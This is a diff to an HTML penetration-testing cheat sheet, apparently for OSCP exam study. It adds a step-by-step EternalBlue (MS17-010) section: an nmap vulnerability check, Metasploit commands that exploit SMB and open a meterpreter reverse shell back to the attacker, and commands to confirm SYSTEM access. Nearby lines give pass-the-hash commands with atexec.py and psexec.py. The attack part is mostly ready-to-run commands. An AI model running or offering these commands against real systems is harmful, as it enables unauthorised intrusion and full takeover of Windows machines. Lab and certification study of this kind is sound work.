@@ -1211,6 +1211,38 @@ atexec.py &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;IP&gt; -hashes :&lt;NTHASH&gt;
               <p><strong>Exploitation (EternalBlue - MS17-010):</strong> <a
                   href="https://github.com/3ndG4me/AutoBlue-MS17-010">https://github.com/3ndG4me/AutoBlue-MS17-010</a>
               </p>
+              
+<p><strong>Vulnerability Check</strong></p>
+<pre><code class="language-bash">nmap -p 445 --script smb-vuln-ms17-010 &lt;IP&gt;
+</code></pre>
+
+<p><strong>Exploit with Metasploit (One-Time Use – OSCP)</strong></p>
+<pre><code class="language-bash">msfconsole
+
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS &lt;IP&gt;
+set RPORT 445
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST tun0
+set LPORT 4444
+run
+</code></pre>
+
+<p><strong>Verify Access Level</strong></p>
+<pre><code class="language-bash">getuid
+whoami
+</code></pre>
+
+<p><strong>Upgrade to Standard Shell (Recommended)</strong></p>
+<pre><code class="language-bash">shell
+</code></pre>
+
+<p><strong>Notes (OSCP)</strong></p>
+<ul>
+  <li>Access obtained as <code>NT AUTHORITY\SYSTEM</code></li>
+  <li>No privilege escalation required</li>
+  <li>Do not continue post-exploitation with Metasploit</li>
+</ul>
               <p><strong>PsExec</strong></p>
               <pre><code class="language-bash"># Credentials
 psexec.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;
